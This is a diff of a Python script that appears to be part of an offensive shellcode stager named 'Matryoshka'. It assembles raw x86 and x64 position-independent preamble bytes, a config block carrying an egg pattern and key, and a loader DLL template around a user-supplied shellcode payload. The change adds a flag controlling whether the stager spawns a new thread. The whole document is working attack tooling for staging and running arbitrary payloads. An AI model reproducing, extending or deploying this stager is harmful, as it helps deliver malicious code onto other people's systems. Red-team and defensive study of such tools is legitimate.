@@ -12,10 +12,11 @@ class Config:
 	MAGIC = 0xC0FFEE
 
 	@classmethod
-	def Generate(cls, size, pattern, key):
+	def Generate(cls, size, pattern, key, flags):
 		magic = struct.pack('I', cls.MAGIC)
 		size = struct.pack('I', size)
-		config = bytearray(magic) + pattern 
+		flag = struct.pack('H', flags)
+		config = bytearray(magic) + pattern + flag
 		
 		return config
 
@@ -66,28 +67,29 @@ class Preamble:
 	@staticmethod
 	def GenerateX86(entrypoint):
 		preamble_size = 28
-		config_size = 12
+		config_size = 14
 		offset = entrypoint + preamble_size + config_size
+		offset_config = preamble_size
 
-		preamble  = b'\xE8' + b'\x00\x00\x00\x00'      # CALL 0
-		preamble += b'\x58'			       # POP EAX
-		preamble += b'\x83\xE8\x05'		       # SUB EAX, 5
-		preamble += b'\x53'			       # PUSH EBX
-		preamble += b'\x8B\xD8'		      	       # MOV EBX, EAX
-		preamble += b'\x05' + struct.pack('I', offset) # ADD EAX, $OFFSET
-		preamble += b'\x83\xC3\x1C'                    # ADD EBX, 1C
-		preamble += b'\x53'			       # PUSH EBX (EBX = Pointer to Config)
-		preamble += b'\xFF\xD0'			       # CALL EAX
-		preamble += b'\x83\xC4\x04'		       # ADD ESP, 4
-		preamble += b'\x5B'			       # POP EBX
-		preamble += b'\xC3'			       # RETN
+		preamble  = b'\xE8' + b'\x00\x00\x00\x00'                 # CALL 0
+		preamble += b'\x58'			                  # POP EAX
+		preamble += b'\x83\xE8\x05'		                  # SUB EAX, 5
+		preamble += b'\x53'			                  # PUSH EBX
+		preamble += b'\x8B\xD8'		      	                  # MOV EBX, EAX
+		preamble += b'\x05' + struct.pack('I', offset)            # ADD EAX, $OFFSET
+		preamble += b'\x83\xC3' + struct.pack('B', offset_config) # ADD EBX, $OFFSET_CONFIG
+		preamble += b'\x53'			                  # PUSH EBX (EBX = Pointer to Config)
+		preamble += b'\xFF\xD0'			                  # CALL EAX
+		preamble += b'\x83\xC4\x04'		                  # ADD ESP, 4
+		preamble += b'\x5B'			                  # POP EBX
+		preamble += b'\xC3'			                  # RETN
 
 		return preamble
 
 	@staticmethod
 	def GenerateX64(entrypoint):
 		preamble_size = 44
-		config_size = 12
+		config_size = 14
 		offset_loader = entrypoint + preamble_size + config_size
 		offset_config = preamble_size
 
@@ -111,17 +113,17 @@ class Preamble:
 class Matryoshka:
 
 	@staticmethod
-	def Generate(payload, architecture):
+	def Generate(payload, architecture, flags):
 		if architecture.lower() == 'x86':
-			return Matryoshka.GenerateX86(payload)
+			return Matryoshka.GenerateX86(payload, flags)
 		elif architecture.lower() == 'x86_64':
-			return Matryoshka.GenerateX64(payload)
+			return Matryoshka.GenerateX64(payload, flags)
 		else:
 			print("[-] Error must specify either x86 or x86_64 as the architecture")
 			sys.exit(-1)
 
 	@staticmethod
-	def GenerateX86(payload):
+	def GenerateX86(payload, flags):
 		print("[i] Opening the x64 shellcode template file") 
 		template = Template("templates/x86/Matryoshka.dll")
 
@@ -138,14 +140,15 @@ class Matryoshka:
 		config = Config.Generate(
 					len(payload),
 					egg.GetPattern(),
-					egg.GetKey()
+					egg.GetKey(),
+					flags
 				)
 		
 		print("[i] Combining the generated config, preamble, and loader")
 		return preamble + config + template.GetShellcode(), egg.Generate()
 		
 	@staticmethod
-	def GenerateX64(payload):
+	def GenerateX64(payload, flags):
 		print("[i] Opening the x64 shellcode template file") 
 		template = Template("templates/x64/Matryoshka.dll")
 		offset = template.GetOffset()
@@ -160,7 +163,8 @@ class Matryoshka:
 		config = Config.Generate(
 					len(payload),
 					egg.GetPattern(),
-					egg.GetKey()
+					egg.GetKey(),
+					flags
 				)		
 
 		print("[i] Combining the generated config, preamble, and loader")
@@ -182,13 +186,20 @@ def main():
 	parser.add_argument(
 		'-e', '--output-egg', help="Path to write Egg value to", required=True
 	)
+	parser.add_argument(
+		'-n', '--no-spawn-thread', help="Do not spawn a new thread when running the stager (may cause stability issues)", action='store_true', required=False
+	)
 	
 	args = parser.parse_args()
-	
+
+	flags = 1
+	if args.no_spawn_thread:
+		flags = 0
+
 	with open(args.shellcode, 'rb') as shellcode:
 		print("[+] Opening the shellcode file specified by the user")
 		payload = shellcode.read()
-		result = Matryoshka.Generate(payload, args.architecture)
+		result = Matryoshka.Generate(payload, args.architecture, flags)
 		matryoshka = result[0]
 		egg = result[1]
 			
